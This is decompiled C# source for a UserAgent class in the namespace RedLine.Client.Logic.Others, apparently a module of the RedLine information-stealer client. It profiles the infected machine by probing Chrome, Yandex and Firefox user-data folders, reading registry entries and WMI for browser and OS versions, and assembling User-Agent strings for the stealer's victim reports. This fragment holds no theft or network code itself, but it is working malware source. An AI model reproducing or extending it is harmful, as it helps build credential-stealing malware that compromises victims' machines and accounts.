using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x02000044 RID: 68
	public class UserAgent
	{
		// Token: 0x060001A3 RID: 419 RVA: 0x00005EB8 File Offset: 0x000040B8
		public static List<string> GetUserAgents()
		{
			List<string> list = new List<string>();
			string osbit = UserAgent.GetOSBit();
			string ntversion = UserAgent.GetNTVersion();
			string text = string.Empty;
			string[] array = ntversion.Split(new char[]
			{
				'.'
			});
			string text2 = string.Empty;
			if (array.Contains("10"))
			{
				text2 = "Windows NT 10.0";
			}
			if (array.Length > 1 && !array.Contains("10"))
			{
				text2 = "Windows NT " + array[0] + "." + array[1];
			}
			try
			{
				if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
				{
					object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
					if (value != null)
					{
						text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
					}
					else
					{
						value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
						text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
					}
					if (osbit == "x64")
					{
						list.Add(string.Concat(new string[]
						{
							"Chrome User-Agent: Mozilla/5.0 (",
							text2,
							"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
							text,
							" Safari/537.36"
						}));
					}
					else
					{
						list.Add(string.Concat(new string[]
						{
							"Chrome User-Agent: Mozilla/5.0 (",
							text2,
							") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
							text,
							" Safari/537.36"
						}));
					}
				}
				if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data"))
				{
					object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\browser.exe", "", null);
					if (value2 != null)
					{
						text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
					}
					else
					{
						value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\browser.exe", "", null);
						text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
					}
					string text3 = string.Empty;
					if (File.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Last Version"))
					{
						text3 = File.ReadAllText(Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Last Version").Trim();
					}
					if (osbit == "x64")
					{
						list.Add(string.Concat(new string[]
						{
							"YandexBrowser User-Agent: Mozilla/5.0 (",
							text2,
							"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
							" Chrome/",
							text3,
							" YaBrowser/",
							text,
							" Safari/537.36"
						}));
					}
					else
					{
						list.Add(string.Concat(new string[]
						{
							"YandexBrowser User-Agent: Mozilla/5.0 (",
							text2,
							") AppleWebKit/537.36 (KHTML, like Gecko)",
							" Chrome/",
							text3,
							" YaBrowser/",
							text,
							" Safari/537.36"
						}));
					}
				}
				if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
				{
					object value3 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
					if (value3 != null)
					{
						text = FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion;
					}
					else
					{
						value3 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
						text = FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion;
					}
					string text4 = string.Empty;
					text4 = text.Split(new char[]
					{
						'.'
					}).First<string>() + "." + text.Split(new char[]
					{
						'.'
					})[1];
					if (osbit == "x64")
					{
						list.Add(string.Concat(new string[]
						{
							"FireFox User-Agent: Mozilla/5.0 (",
							text2,
							"; Win64; x64; rv:",
							text4,
							") Gecko/20100101 Firefox/",
							text4
						}));
					}
					else
					{
						list.Add(string.Concat(new string[]
						{
							"FireFox User-Agent: Mozilla/5.0 (",
							text2,
							"; rv:",
							text4,
							") Gecko/20100101 Firefox/",
							text4
						}));
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x00006298 File Offset: 0x00004498
		private static ManagementObject GetMngObj(string className)
		{
			ManagementObject result;
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass(className).GetInstances().GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject managementBaseObject = enumerator.Current;
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					if (managementObject != null)
					{
						return managementObject;
					}
				}
				result = null;
			}
			return result;
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x000062F4 File Offset: 0x000044F4
		private static string GetOsVersion()
		{
			string result;
			try
			{
				ManagementObject mngObj = UserAgent.GetMngObj("Win32_OperatingSystem");
				if (mngObj == null)
				{
					result = string.Empty;
				}
				else
				{
					result = (mngObj["Version"] as string);
				}
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x00006344 File Offset: 0x00004544
		private static string GetNTVersion()
		{
			string result;
			try
			{
				result = UserAgent.GetOsVersion();
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x00006374 File Offset: 0x00004574
		private static string GetOSBit()
		{
			if (UserAgent.Is64Bit())
			{
				return "x64";
			}
			return "x32";
		}

		// Token: 0x060001A8 RID: 424
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

		// Token: 0x060001A9 RID: 425 RVA: 0x00006388 File Offset: 0x00004588
		private static bool Is64Bit()
		{
			bool result;
			UserAgent.IsWow64Process(Process.GetCurrentProcess().Handle, out result);
			return result;
		}
	}
}
